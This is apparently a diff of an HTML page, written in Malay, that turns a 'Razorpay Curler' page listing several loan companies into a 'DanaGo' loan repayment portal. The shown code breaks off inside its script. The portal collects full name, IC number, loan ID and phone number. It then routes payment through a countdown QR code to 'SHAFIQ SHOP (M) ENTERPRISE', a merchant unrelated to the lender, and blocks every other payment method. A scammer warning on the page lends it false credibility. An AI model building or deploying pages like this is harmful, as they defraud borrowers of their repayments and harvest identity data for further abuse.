@@ -1,356 +1,567 @@
 <!DOCTYPE html>
 <html lang="ms">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Razorpay Curler - Payment Portal</title>
-  <style>
-    :root{
-      --bg:#f4f7fb;
-      --card:#ffffff;
-      --text:#0f172a;
-      --muted:#64748b;
-      --primary:#2563eb;
-      --primary2:#1d4ed8;
-      --line:#e2e8f0;
-      --ok:#16a34a;
-      --warn:#b45309;
-      --shadow:0 18px 50px rgba(15,23,42,.08);
-      --radius:24px;
-    }
-    *{box-sizing:border-box;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}
-    body{
-      margin:0;
-      color:var(--text);
-      background:
-        radial-gradient(circle at top left, rgba(37,99,235,.12), transparent 28%),
-        linear-gradient(180deg,#f8fbff 0%, var(--bg) 100%);
-      min-height:100vh;
-    }
-    .wrap{max-width:1180px;margin:0 auto;padding:24px}
-    header{
-      display:flex;align-items:center;justify-content:space-between;
-      gap:16px;padding:6px 0 18px;
-    }
-    .title{
-      font-weight:800;font-size:1.1rem;letter-spacing:-.02em;
-    }
-    .panel{
-      background:rgba(255,255,255,.9);
-      backdrop-filter:blur(10px);
-      border:1px solid rgba(226,232,240,.9);
-      border-radius:var(--radius);
-      box-shadow:var(--shadow);
-    }
-    .hero, .checkout{
-      padding:28px;
-    }
-    .hero-grid{
-      display:grid;
-      grid-template-columns:1.08fr .92fr;
-      gap:24px;
-      margin-top:10px;
-    }
-    .hero h1{
-      margin:0 0 12px;
-      font-size:clamp(2rem,4.8vw,3.4rem);
-      line-height:1.05;
-      letter-spacing:-.04em;
-    }
-    .hero p{
-      margin:0;
-      color:var(--muted);
-      max-width:60ch;
-      line-height:1.7;
-    }
-    .badge-row{display:flex;flex-wrap:wrap;gap:10px;margin-top:22px}
-    .badge{
-      padding:10px 14px;border-radius:999px;
-      background:#eff6ff;color:#1d4ed8;font-weight:700;font-size:.92rem;
-      border:1px solid #dbeafe;
-    }
-    .card-title{
-      display:flex;align-items:center;justify-content:space-between;gap:14px;
-      margin-bottom:18px;
-    }
-    .card-title h2{margin:0;font-size:1.2rem}
-    .card-title span{color:var(--muted);font-size:.92rem}
-    .grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
-    .field{display:flex;flex-direction:column;gap:8px}
-    .full{grid-column:1/-1}
-    label{font-size:.92rem;font-weight:700}
-    input, select{
-      width:100%;padding:14px 15px;border-radius:14px;
-      border:1px solid var(--line);background:#fff;font-size:1rem;
-      outline:none;transition:.2s ease;
-    }
-    input:focus, select:focus{
-      border-color:#93c5fd;box-shadow:0 0 0 4px rgba(96,165,250,.14);
-    }
-    .actions{display:flex;gap:12px;flex-wrap:wrap;margin-top:18px}
-    .btn{
-      border:none;cursor:pointer;font-weight:800;
-      padding:14px 18px;border-radius:14px;
-      transition:.2s ease;
-    }
-    .btn-primary{background:linear-gradient(135deg,var(--primary),var(--primary2));color:#fff;flex:1}
-    .btn-soft{background:#f8fafc;color:var(--text);border:1px solid var(--line)}
-    .btn:hover{transform:translateY(-1px)}
-    .hidden{display:none !important;}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DanaGo - Portal Pembayaran</title>
 
-    .flow{
-      display:flex;flex-wrap:wrap;gap:10px;margin-bottom:18px
-    }
-    .step{
-      padding:9px 12px;border-radius:999px;
-      background:#eff6ff;color:#1d4ed8;font-weight:700;font-size:.92rem;
-      border:1px solid #dbeafe;
-    }
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://danago.my/">
+    <meta property="og:title" content="DanaGo - Portal Pembayaran">
+    <meta property="og:description" content="Halaman Web Resmi Pembayaran Pengembalian Pinjaman DanaGo. Selamat, pantas, dan terenkripsi.">
+    <meta property="og:image" content="IMG_6398.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta name="robots" content="noimageindex">
 
-    .method-grid{
-      display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:14px
-    }
-    .method{
-      padding:16px;border:1px solid var(--line);border-radius:16px;background:#fff;
-      cursor:pointer;transition:.2s ease;font-weight:800;text-align:center;
-    }
-    .method:hover,.method.active{
-      border-color:#93c5fd;box-shadow:0 10px 24px rgba(37,99,235,.10)
-    }
-    .payment-section{
-      margin-top:18px;padding:18px;border-radius:18px;
-      background:#f8fbff;border:1px solid #dbeafe;
-    }
-    .note{
-      padding:14px 16px;border-radius:14px;margin-top:14px;
-      background:#f8fafc;border:1px dashed #cbd5e1;color:var(--muted)
-    }
-
-    .warning{
-      position:fixed;left:50%;top:22px;transform:translateX(-50%);
-      background:linear-gradient(135deg,#111827,#1f2937);
-      color:#fff;padding:14px 18px;border-radius:16px;
-      box-shadow:0 18px 40px rgba(0,0,0,.22);
-      z-index:9999;min-width:min(92vw,540px);
-      display:none;
-      align-items:center;justify-content:center;text-align:center;
-      font-weight:700;
-    }
-
-    .bank-row{
-      display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-top:12px
-    }
-    .bank{
-      padding:13px 14px;border:1px solid var(--line);border-radius:14px;
-      background:#fff;cursor:pointer;font-weight:700;text-align:left;
-    }
-    .bank.active{border-color:#93c5fd;background:#eff6ff}
-
-    .qr-wrap{
-      margin-top:18px;padding:18px;border-radius:18px;
-      background:#fff;border:1px solid var(--line);
-      display:none;
-    }
-    .qr-top{
-      display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;
-      margin-bottom:16px;
-    }
-    .timer{
-      padding:8px 12px;border-radius:999px;background:#fef3c7;color:#92400e;font-weight:800;
-      border:1px solid #fde68a;
-    }
-    .qr-box{
-      width:min(100%,320px);aspect-ratio:1/1;margin:0 auto;
-      border:1px dashed #cbd5e1;border-radius:22px;
-      display:grid;place-items:center;
-      background:
-        linear-gradient(45deg, rgba(37,99,235,.04) 25%, transparent 25%),
-        linear-gradient(-45deg, rgba(37,99,235,.04) 25%, transparent 25%),
-        linear-gradient(45deg, transparent 75%, rgba(37,99,235,.04) 75%),
-        linear-gradient(-45deg, transparent 75%, rgba(37,99,235,.04) 75%);
-      background-size:24px 24px;
-      background-position:0 0,0 12px,12px -12px,-12px 0;
-    }
-    .qr-box span{
-      display:inline-block;padding:12px 14px;border-radius:12px;
-      background:#fff;border:1px solid var(--line);font-weight:800;color:var(--text)
-    }
-
-    .success{
-      margin-top:14px;padding:14px 16px;border-radius:14px;
-      background:#ecfdf5;color:#166534;border:1px solid #bbf7d0;
-      display:none;font-weight:700;
-    }
-
-    .switch{
-      margin-top:16px;display:flex;gap:12px;flex-wrap:wrap
-    }
-
-    footer{padding:24px 0 8px;color:var(--muted);font-size:.92rem;text-align:center}
-
-    @media (max-width: 980px){
-      .hero-grid{grid-template-columns:1fr}
-      .method-grid{grid-template-columns:1fr}
-    }
-    @media (max-width: 720px){
-      .grid,.bank-row{grid-template-columns:1fr}
-      .hero,.checkout{padding:20px}
-      header{flex-direction:column;align-items:flex-start}
-    }
-  </style>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+        .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+    </style>
 </head>
-<body>
-  <div class="warning" id="toastWarning">
-    Maaf kaedah ini tidak tersedia sekarang. sila pilih kaedah lain.
-  </div>
+<body class="font-sans bg-[#FAF6F0] text-gray-900 min-h-screen flex flex-col justify-between">
 
-  <div class="wrap">
-    <header>
-      <div class="title">Razorpay Curler</div>
-      <button class="btn btn-primary" id="goCompany">Pilih Syarikat</button>
-    </header>
+    <div id="mainPage" class="flex flex-col min-h-screen justify-between">
+        <header class="bg-white shadow-sm">
+            <div class="max-w-md mx-auto px-4 py-4 flex justify-between items-center">
+                <div class="flex items-center space-x-2">
+                    <img src="IMG_6398.png" alt="DanaGo Logo" class="h-8 object-contain" onerror="this.outerHTML='<span class=\'font-bold text-xl text-slate-800\'>Dana<span class=\'text-red-500\'>Go</span></span>\''">
+                </div>
+                <button class="text-gray-700 hover:text-gray-900"><i class="fas fa-bars text-2xl"></i></button>
+            </div>
+        </header>
 
-    <section class="hero-grid">
-      <div class="panel hero">
-        <h1>Bayaran Mudah, Kemas & Mesra Mudah Alih</h1>
-        <p>
-          Pilih syarikat dahulu, kemudian terus ke halaman bayaran untuk memilih kaedah yang tersedia.
-          Rekaan ini sesuai untuk preview portal pembayaran yang ringkas dan moden.
-        </p>
-        <div class="badge-row">
-          <div class="badge">DuitNow QR</div>
-          <div class="badge">Premium UI</div>
-          <div class="badge">Responsive</div>
-          <div class="badge">Fast Flow</div>
+        <main class="max-w-md mx-auto px-4 py-12 text-center flex-grow flex flex-col justify-center items-center">
+            <div class="inline-block bg-orange-100 text-red-600 font-semibold text-xs px-3 py-1.5 rounded-full uppercase tracking-wider mb-6">
+                • KREDIT PINTAR, TERMA RINGKAS
+            </div>
+            <h1 class="text-3xl font-extrabold text-slate-950 tracking-tight leading-tight mb-6">
+                Dapatkan tunai <span class="text-red-500">dalam minit,</span> bukan minggu
+            </h1>
+            <p class="text-gray-600 text-sm max-w-xl mx-auto mb-10">
+                Kelulusan 5 minit, tiada caj tersembunyi. Tunai dalam akaun anda hari ini.
+            </p>
+
+            <div class="w-full max-w-xs mb-16">
+                <button onclick="goToPaymentPage()" class="w-full bg-red-500 hover:bg-red-600 text-white font-bold text-md px-6 py-4 rounded-xl shadow-lg shadow-red-500/30 transition duration-200 flex items-center justify-center gap-3 cursor-pointer">
+                    Pembayaran Pinjaman <i class="fas fa-arrow-right text-sm"></i>
+                </button>
+            </div>
+        </main>
+        <footer class="bg-[#111827] text-gray-400 py-6 text-xs text-center border-t border-gray-800">
+            <p>&copy; 2026 DanaGo. Hak cipta terpelihara.</p>
+        </footer>
+    </div>
+
+
+    <div id="paymentPage" class="hidden flex-col min-h-screen bg-white">
+        <main class="max-w-md w-full mx-auto px-4 py-6 flex-grow flex flex-col items-center">
+            <div class="w-20 h-20 rounded-2xl overflow-hidden shadow-xs mb-4 flex items-center justify-center">
+                <img src="IMG_6398.png" alt="Logo" class="w-full h-full object-contain">
+            </div>
+            <h2 class="text-gray-500 font-semibold text-center text-xs max-w-xs mb-6 leading-relaxed">
+                Halaman Web Resmi Pembayaran Pengembalian Pinjaman
+            </h2>
+
+            <div class="w-full bg-white rounded-2xl p-1">
+                <div class="text-lg font-bold text-slate-900 flex items-center gap-2 mb-6 px-1">
+                    <span>📋</span>
+                    <h3>Langkah 1 : Maklumat Pelanggan</h3>
+                </div>
+
+                <form onsubmit="goToNextStepPage(event)" class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-bold text-slate-800 mb-1.5">Nama Penuh (ikut IC) *</label>
+                        <input type="text" id="inputNama" required placeholder="Masukkan nama lengkap Anda" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-800 mb-1.5">Nombor kad pengenalan *</label>
+                        <input type="text" id="inputIC" required placeholder="Contoh: 950102035432" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-800 mb-1.5">ID Loan *</label>
+                        <input type="text" id="inputLoanID" required placeholder="Cth: DG88321" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-800 mb-1.5">Nombor Telefon *</label>
+                        <input type="tel" id="inputPhone" required placeholder="Contoh: 0123456789" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-800 mb-1.5">Jumlah membuat bayaran *</label>
+                        <input type="number" step="0.01" id="inputAmaun" required placeholder="0.00" class="w-full px-4 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-blue-600 focus:outline-none text-sm">
+                    </div>
+                    <div class="pt-4">
+                        <button type="submit" class="w-full bg-gradient-to-r from-red-600 to-black text-white font-bold text-sm py-3 px-6 rounded-xl shadow-lg flex items-center justify-center gap-2 cursor-pointer">
+                            Seterusnya <i class="fas fa-arrow-right text-xs"></i>
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </main>
+    </div>
+
+
+    <div id="nextStepPage" class="hidden flex-col min-h-screen bg-white">
+        <main class="max-w-md w-full mx-auto px-4 py-6 flex-grow flex flex-col items-center">
+            <div class="w-20 h-20 rounded-2xl overflow-hidden shadow-xs mb-4 flex items-center justify-center">
+                <img src="IMG_6398.png" alt="Logo" class="w-full h-full object-contain">
+            </div>
+
+            <div class="w-full bg-[#FAF6F0] rounded-2xl border border-gray-200 p-5 mb-6">
+                <div class="text-md font-bold text-slate-900 flex items-center gap-2 mb-4">
+                    <span>🔍</span>
+                    <h3>Sila Semak Maklumat Anda</h3>
+                </div>
+                <div class="space-y-3 border-t border-gray-200 pt-4 text-xs">
+                    <div class="flex justify-between"><span class="text-gray-500">Nama Penuh:</span><span id="reviewNama" class="font-bold text-slate-900">-</span></div>
+                    <div class="flex justify-between"><span class="text-gray-500">No. IC:</span><span id="reviewIC" class="font-bold text-slate-900">-</span></div>
+                    <div class="flex justify-between"><span class="text-gray-500">ID Loan:</span><span id="reviewLoanID" class="font-bold text-amber-600">-</span></div>
+                    <div class="flex justify-between"><span class="text-gray-500">Nombor Telefon:</span><span id="reviewPhone" class="font-bold text-slate-900">-</span></div>
+                    <div class="flex justify-between border-t border-dashed border-gray-300 pt-2"><span class="font-bold text-gray-700">Jumlah Bayaran:</span><span id="reviewAmaun" class="font-extrabold text-red-600 text-sm">RM 0.00</span></div>
+                </div>
+            </div>
+
+            <div class="w-full flex gap-3">
+                <button onclick="backToInformationPage()" class="flex-1 bg-gray-200 text-gray-700 font-bold py-3 rounded-xl text-xs cursor-pointer">← Sebelum</button>
+                <button onclick="goToStep3Page()" class="flex-1 bg-gradient-to-r from-black to-red-600 text-white font-bold py-3 rounded-xl text-xs flex items-center justify-center gap-1 cursor-pointer">Seterusnya →</button>
+            </div>
+        </main>
+    </div>
+
+
+    <div id="step3Page" class="hidden flex-col min-h-screen bg-white">
+        <header class="bg-white border-b border-gray-100 py-3.5 px-4 shadow-xs">
+            <div class="max-w-md mx-auto flex justify-between items-center">
+                <img src="IMG_6398.png" alt="DanaGo" class="h-6 object-contain">
+                <button class="text-slate-800"><i class="fas fa-bars text-xl"></i></button>
+            </div>
+        </header>
+
+        <main class="max-w-md w-full mx-auto px-4 py-4 flex-grow">
+            <button onclick="backToStep2Page()" class="flex items-center gap-2 text-slate-800 font-bold text-sm mb-4 cursor-pointer">
+                <i class="fas fa-chevron-left text-xs"></i> Bayaran Balik
+            </button>
+
+            <div class="bg-[#F6F0FF] rounded-2xl p-5 border border-purple-100 shadow-xs mb-4">
+                <div class="flex justify-between items-start text-xs font-semibold text-slate-900 mb-2">
+                    <span>Jumlah Pembayaran</span>
+                    <div class="text-right">
+                        <span class="text-gray-500 font-normal">ID Loan:</span> 
+                        <span id="displayLoanID" class="text-slate-900 font-bold ml-1">-</span>
+                    </div>
+                </div>
+                
+                <div id="displayMainAmaun" class="text-3xl font-bold text-slate-950 mb-4">RM 0.00</div>
+
+                <div class="flex justify-between items-center text-xs text-gray-500 mb-3">
+                    <span>Baki Baharu Perlu Dibayar:</span>
+                    <span class="font-bold text-slate-900">RM 0.00</span>
+                </div>
+
+                <div class="bg-[#1A73E8] text-white rounded-xl px-4 py-2.5 flex justify-between items-center text-xs font-bold">
+                    <span>Jumlah Transaksi</span>
+                    <span id="displaySubAmaun">RM 0.00</span>
+                </div>
+            </div>
+
+            <div class="bg-[#1A73E8] text-white text-[11px] font-medium p-3 rounded-lg flex items-start gap-2 mb-6 shadow-xs leading-relaxed">
+                <i class="fas fa-exclamation-triangle mt-0.5 flex-shrink-0"></i>
+                <span>Sila HANYA pindahkan JUMLAH TRANSAKSI yang diserlahkan di atas.</span>
+            </div>
+
+            <h3 class="text-sm font-bold text-slate-900 mb-3">Kaedah Pembayaran</h3>
+
+            <div class="grid grid-cols-2 gap-3 mb-6">
+                <button id="btnDuitNow" class="bg-[#F9F6FF] border-2 border-purple-600 rounded-xl p-4 text-left flex flex-col justify-between h-24 shadow-xs">
+                    <i class="fas fa-lock text-slate-800 text-sm"></i>
+                    <span class="text-sm font-bold text-slate-900">DuitNow</span>
+                </button>
+
+                <button onclick="alert('Maaf, kaedah pembayaran ini tidak tersedia buat masa sekarang. Sila gunakan saluran DuitNow sahaja.')" class="bg-white border border-gray-200 rounded-xl p-4 text-left flex flex-col justify-between h-24 hover:bg-gray-50 cursor-pointer">
+                    <i class="fas fa-lock text-gray-400 text-sm"></i>
+                    <span class="text-sm font-bold text-gray-700">Online Banking</span>
+                </button>
+            </div>
+
+            <div class="space-y-4 mb-8">
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1.5">Saluran</label>
+                    <select disabled class="w-full bg-white border border-gray-200 px-4 py-3 rounded-xl text-xs font-semibold text-slate-900 appearance-none">
+                        <option>Duitnow</option>
+                    </select>
+                </div>
+
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1.5">Bank *</label>
+                    <div class="relative">
+                        <select id="selectBank" onchange="checkBankSelection()" class="w-full bg-white border border-gray-300 px-4 py-3 rounded-xl text-xs font-semibold text-slate-900 appearance-none focus:ring-2 focus:ring-purple-600 focus:outline-none cursor-pointer">
+                            <option value="" disabled selected>-- SILA PILIH BANK --</option>
+                            <option value="TNG">1- TOUCH'N GO</option>
+                            <option value="MAYBANK">2- MAYBANK QRPAY</option>
+                            <option value="DUITNOW_QR">3- DUITNOW QR/e-WALLET PAYMENT</option>
+                            <option value="RHB">4- RHB QRPAY</option>
+                            <option value="GRABPAY">5- GRABPAY</option>
+                            <option value="BOOST">6- BOOST</option>
+                        </select>
+                        <div class="absolute inset-y-0 right-4 flex items-center pointer-events-none text-gray-500 text-xs">
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="flex gap-3 pt-4 border-t border-gray-100">
+                <button onclick="backToStep2Page()" class="flex-1 bg-white border border-gray-200 text-slate-700 font-bold py-3.5 rounded-xl text-xs text-center shadow-xs cursor-pointer">Kembali</button>
+                <button id="btnFinalNext" onclick="goToQRPage()" disabled class="flex-1 bg-gray-400 text-white font-bold py-3.5 rounded-xl text-xs text-center shadow-xs cursor-not-allowed transition duration-150">Seterusnya</button>
+            </div>
+        </main>
+    </div>
+
+
+    <div id="qrPage" class="hidden flex-col min-h-screen bg-gray-50">
+        <div class="max-w-md w-full mx-auto bg-white min-h-screen flex flex-col shadow-lg border-x border-gray-100">
+            
+            <div class="flex justify-between items-center px-6 py-4 border-b border-gray-100 text-[11px] font-bold text-gray-500 tracking-wider">
+                <div class="flex items-center gap-1.5">
+                    <span class="w-2 h-2 rounded-full bg-teal-500"></span> AUTHORIZATION
+                </div>
+                <div class="flex items-center gap-1.5 text-gray-300">
+                    <span class="w-2 h-2 rounded-full bg-gray-300"></span> RESULT
+                </div>
+            </div>
+
+            <div class="px-6 py-4 grid grid-cols-2 gap-4 text-center border-b border-dashed border-gray-200 bg-white">
+                <div>
+                    <p class="text-[10px] text-gray-400 font-bold uppercase tracking-tight">Reference No.</p>
+                    <p class="text-xs font-extrabold text-slate-800">FXD_13121199</p>
+                </div>
+                <div>
+                    <p class="text-[10px] text-gray-400 font-bold uppercase tracking-tight">ID LOAN</p>
+                    <p id="qrLoanID" class="text-xs font-extrabold text-slate-800">-</p>
+                </div>
+            </div>
+
+            <div class="p-6 flex-grow flex flex-col items-center justify-start text-center">
+                
+                <div id="qrBankBadge" class="mb-3 bg-[#1A73E8] text-white text-xs font-black px-4 py-2 rounded-lg shadow-xs tracking-wide">
+                    Touch 'n Go eWallet
+                </div>
+
+                <p class="text-[11px] font-bold text-gray-400 uppercase tracking-wide">Please Pay</p>
+                <h1 class="text-2xl font-black text-slate-900 mt-0.5 mb-4">
+                    <span id="qrMainAmaun">RM 0.00</span> <span class="text-xs font-normal text-gray-400">ONLY</span>
+                </h1>
+
+                <div class="w-64 p-4 border-[12px] border-[#E91E63] rounded-3xl bg-white shadow-md flex flex-col items-center justify-center relative">
+                    <img src="IMG_6267.jpeg" alt="QR Code" class="w-full h-auto object-contain rounded-lg" onerror="this.src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=DanaGoPayment'">
+                    
+                    <p class="text-[9px] font-bold text-gray-400 mt-3 tracking-tighter">ONE TIME USE, VALID TILL 2026-06-02</p>
+                    
+                    <h2 class="text-sm font-black text-slate-900 mt-2 tracking-tight leading-tight">
+                        SHAFIQ SHOP (M) ENTERPRISE
+                    </h2>
+
+                    <div class="mt-4 bg-red-50 border border-red-100 rounded-xl px-4 py-2 w-full">
+                        <p class="text-[10px] font-bold text-red-500 uppercase tracking-wider">Time Remaining</p>
+                        <p id="countdownTimer" class="text-base font-black text-red-600">1m 59s</p>
+                    </div>
+                </div>
+
+                <p class="text-[11px] text-gray-500 font-semibold mt-4 max-w-xs leading-relaxed px-2">
+                    Scan the QR code and complete the payment. <br>This payment valid for <span class="text-red-500 font-bold">ONE TIME</span> use only.
+                </p>
+
+                <div class="w-full max-w-sm mt-6 border-t border-dashed border-gray-200 pt-6 text-left">
+                    <label class="block text-xs font-black text-slate-800 mb-2">
+                        <i class="fas fa-cloud-upload-alt text-purple-600 mr-1"></i> Muat Naik Resit Pembayaran *
+                    </label>
+                    <div class="relative bg-white border-2 border-dashed border-purple-300 rounded-xl p-4 text-center hover:bg-purple-50/50 transition cursor-pointer">
+                        <input type="file" id="receiptUpload" accept="image/*,application/pdf" onchange="handleFileSelected()" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10">
+                        <div id="uploadPlaceholder" class="space-y-1">
+                            <i class="fas fa-images text-2xl text-purple-400"></i>
+                            <p class="text-xs font-bold text-gray-600">Klik atau letakkan tangkapan skrin resit di sini</p>
+                            <p class="text-[10px] text-gray-400">Format: PNG, JPG, PDF sehingga 5MB</p>
+                        </div>
+                        <div id="uploadSuccess" class="hidden space-y-1 text-emerald-600">
+                            <i class="fas fa-check-circle text-2xl"></i>
+                            <p class="text-xs font-bold" id="fileNameDisplay">Resit berjaya dimuat naik!</p>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="p-4 bg-white border-t border-gray-100 flex gap-3">
+                <button onclick="backToStep3Page()" class="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-600 font-bold py-3.5 rounded-xl text-xs text-center transition cursor-pointer">
+                    Sebelum
+                </button>
+                <button id="btnSubmitForm" onclick="finalSubmission()" disabled class="flex-1 bg-gray-400 text-white font-bold py-3.5 rounded-xl text-xs text-center shadow-md cursor-not-allowed transition duration-150">
+                    Hantar Permohonan
+                </button>
+            </div>
+
         </div>
-        <div class="switch">
-          <button class="btn btn-primary" id="openCheckout">Halaman Bayaran</button>
-          <button class="btn btn-soft" id="resetAll">Reset</button>
+    </div>
+
+
+    <div id="thanksPage" class="hidden flex-col min-h-screen bg-white justify-between">
+        <header class="bg-white border-b border-gray-100 py-4 px-4 shadow-xs text-center">
+            <div class="max-w-md mx-auto flex justify-center">
+                <img src="IMG_6398.png" alt="DanaGo Logo" class="h-8 object-contain">
+            </div>
+        </header>
+
+        <main class="max-w-md w-full mx-auto px-6 py-12 flex-grow flex flex-col items-center justify-center text-center">
+            <div class="w-20 h-20 bg-emerald-50 rounded-full flex items-center justify-center text-emerald-500 text-4xl mb-6 shadow-xs">
+                <i class="fas fa-check-circle animate-pulse"></i>
+            </div>
+
+            <h1 class="text-2xl font-black text-slate-900 tracking-tight mb-2">
+                Pembayaran Berjaya
+            </h1>
+            
+            <div class="inline-block bg-amber-50 border border-amber-200 text-amber-700 font-bold text-xs px-4 py-2 rounded-xl mb-8">
+                <i class="fas fa-clock mr-1"></i> Sedang disemak dalam masa 24jam
+            </div>
+
+            <div class="bg-gray-50 border border-gray-100 rounded-2xl p-6 shadow-xs max-w-sm w-full">
+                <p id="thanksMessage" class="text-sm text-gray-700 leading-relaxed font-medium">
+                    -
+                </p>
+            </div>
+
+            <div class="w-full max-w-xs mt-10">
+                <button onclick="window.location.reload()" class="w-full bg-slate-900 hover:bg-slate-950 text-white font-bold text-xs py-3.5 rounded-xl shadow-md transition cursor-pointer">
+                    Kembali Ke Laman Utama
+                </button>
+            </div>
+        </main>
+
+        <footer class="bg-gray-50 text-gray-400 py-4 text-[10px] text-center border-t border-gray-100">
+            <p>&copy; 2026 DanaGo. Transaksi Selamat & Terenkripsi.</p>
+        </footer>
+    </div>
+
+
+    <div id="scammerModal" class="fixed inset-0 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4 hidden z-50">
+        <div class="bg-[#F5F5F5] rounded-3xl max-w-md w-full shadow-2xl overflow-hidden flex flex-col border border-gray-200">
+            
+            <div class="bg-[#E53935] text-white text-center py-4 font-extrabold text-sm uppercase tracking-wider">
+                AMARAN SCAMMER
+            </div>
+            
+            <div class="p-5 space-y-4 max-h-[65vh] overflow-y-auto no-scrollbar text-xs">
+                
+                <div class="bg-white rounded-2xl p-4 border-l-4 border-[#2E7D32] shadow-xs">
+                    <div class="flex items-center gap-2 mb-2">
+                        <i class="fas fa-check-circle text-[#2E7D32] text-sm"></i>
+                        <p class="font-extrabold text-[#2E7D32] text-sm">Laman Web Rasmi</p>
+                    </div>
+                    <p class="text-gray-600 font-medium mb-3">Kami hanya ada <span class="font-bold text-gray-900">satu (1)</span> laman web rasmi:</p>
+                    <a href="https://danago.my/" target="_blank" class="inline-flex items-center gap-2 bg-[#E8F5E9] text-[#2E7D32] font-bold px-4 py-2 rounded-xl border border-[#C8E6C9] hover:bg-[#C8E6C9] transition">
+                        <i class="fas fa-globe"></i> www.danago.my
+                    </a>
+                </div>
+
+                <div class="bg-white rounded-2xl p-4 border-l-4 border-[#1565C0] shadow-xs">
+                    <div class="flex items-center gap-2 mb-3">
+                        <i class="fas fa-wallet text-[#1565C0] text-sm"></i>
+                        <p class="font-extrabold text-[#1565C0] text-sm">Cara Pembayaran Yang Sah</p>
+                    </div>
+                    <ul class="space-y-2 text-gray-600 font-medium list-none pl-0">
+                        <li class="flex items-start gap-2">
+                            <span class="text-red-500 mt-0.5">•</span>
+                            <span>Login akaun anda sendiri di laman web rasmi untuk mendapatkan <span class="font-bold text-gray-900">QR Kod Pembayaran</span>.</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-red-500 mt-0.5">•</span>
+                            <span><span class="font-bold text-gray-900">Tiada</span> bayaran melalui email, Facebook, WhatsApp atau pihak ketiga.</span>
+                        </li>
+                    </ul>
+                    <div class="mt-4 bg-red-50 text-red-600 font-black text-center py-2.5 rounded-xl border border-red-100 uppercase tracking-wide">
+                        Selain dari ini adalah PENIPUAN.
+                    </div>
+                </div>
+
+                <div class="bg-white rounded-2xl p-4 border-l-4 border-[#EF6C00] shadow-xs">
+                    <div class="flex items-center gap-2 mb-3">
+                        <i class="fas fa-exclamation-triangle text-[#EF6C00] text-sm"></i>
+                        <p class="font-extrabold text-[#EF6C00] text-sm">Taktik Scammer</p>
+                    </div>
+                    <ul class="space-y-2.5 text-gray-600 font-medium list-none pl-0">
+                        <li class="flex items-start gap-2">
+                            <span class="text-red-500 mt-0.5">•</span>
+                            <span>Scammer akan menghantar <span class="font-bold text-gray-900">screenshot QR Kod palsu</span> melalui WhatsApp.</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-red-500 mt-0.5">•</span>
+                            <span>Sila <span class="font-bold text-gray-900">abaikan</span> dan jangan klik pautan yang dihantar oleh pihak luar.</span>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-red-500 mt-0.5">•</span>
+                            <span>Sentiasa login akaun sendiri dan bayar melalui laman web rasmi sahaja.</span>
+                        </li>
+                    </ul>
+                </div>
+
+            </div>
+            
+            <div class="p-4 bg-white border-t border-gray-100 flex justify-center">
+                <button onclick="closeScammerModal()" class="w-full bg-[#E53935] hover:bg-[#D32F2F] text-white font-bold py-3 rounded-xl text-xs shadow-md flex items-center justify-center gap-2 transition cursor-pointer active:scale-98">
+                    <i class="fas fa-check-circle"></i> Saya Faham
+                </button>
+            </div>
+
         </div>
-      </div>
+    </div>
 
-      <div class="panel hero">
-        <div class="card-title">
-          <h2>Pilih Syarikat</h2>
-          <span>Langkah 1</span>
-        </div>
 
-        <div class="field full">
-          <label for="company">Senarai Syarikat</label>
-          <select id="company">
-            <option value="">-- Pilih syarikat --</option>
-            <option>Tambadana</option>
-            <option>Tazee</option>
-            <option>Adacash</option>
-            <option>EvoCredit</option>
-            <option>DuitGini</option>
-            <option>FastRinggit</option>
-            <option>Adawang</option>
-            <option>PinjamGo</option>
-            <option>DuitJom</option>
-            <option>Finroro/Fundora</option>
-            <option>WantKash</option>
-          </select>
-        </div>
+    <script>
+        let timerInstance = null;
+        let namaPelangganGlobal = "";
 
-        <div class="note">
-          Selepas pilih syarikat, tekan <strong>Halaman Bayaran</strong>.
-        </div>
-      </div>
-    </section>
+        function goToPaymentPage() {
+            document.getElementById('mainPage').classList.add('hidden');
+            document.getElementById('paymentPage').classList.remove('hidden');
